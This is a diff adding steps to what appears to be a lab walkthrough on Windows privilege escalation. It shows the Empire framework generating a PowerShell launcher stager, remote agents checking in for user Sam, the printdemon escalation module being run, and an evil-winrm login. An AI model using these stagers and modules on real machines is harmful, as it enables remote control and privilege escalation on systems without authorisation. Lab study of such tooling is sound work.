@@ -499,6 +499,44 @@ Options:
 (Empire: powershell/privesc/printdemon) > 
 ```
 
+```bash
+(Empire) > usestager multi/launcher
+(Empire: stager/multi/launcher) > set Listener http
+(Empire: stager/multi/launcher) > execute
+powershell -noP -sta -w 1 -enc  SQBGACgAJAB....
+(Empire: stager/multi/launcher) > 
+[*] Sending POWERSHELL stager (stage 1) to 10.201.81.79
+[*] New agent BXZN97UL checked in
+(Empire: stager/multi/launcher) > [+] Initial agent BXZN97UL from 10.201.81.79 now active (Slack)
+[*] Sending agent (stage 2) to BXZN97UL at 10.201.81.79
+(Empire: stager/multi/launcher) > 
+```
+
+```bash
+main
+```
+
+```bash
+(Empire) > agents
+
+[*] Active agents:
+
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+ 32H68BSD ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         4976   5/0.0    2025-09-17 23:55:49  http            
+ BXZN97UL ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         3608   5/0.0    2025-09-18 00:34:10  http   
+```
+
+```bash
+(Empire: agents) > interact BXZN97UL
+(Empire: BXZN97UL) > usemodule privesc/printdemon
+(Empire: powershell/privesc/printdemon) > set LauncherCode ....
+(Empire: powershell/privesc/printdemon) > execute
+```
+
+<img width="1239" height="156" alt="image" src="https://github.com/user-attachments/assets/31000402-19b8-42f7-930b-c32c93190d9f" />
+
+
 
 ```bash
 :~/DLLHijacking# evil-winrm -i TargetIP -u Sam
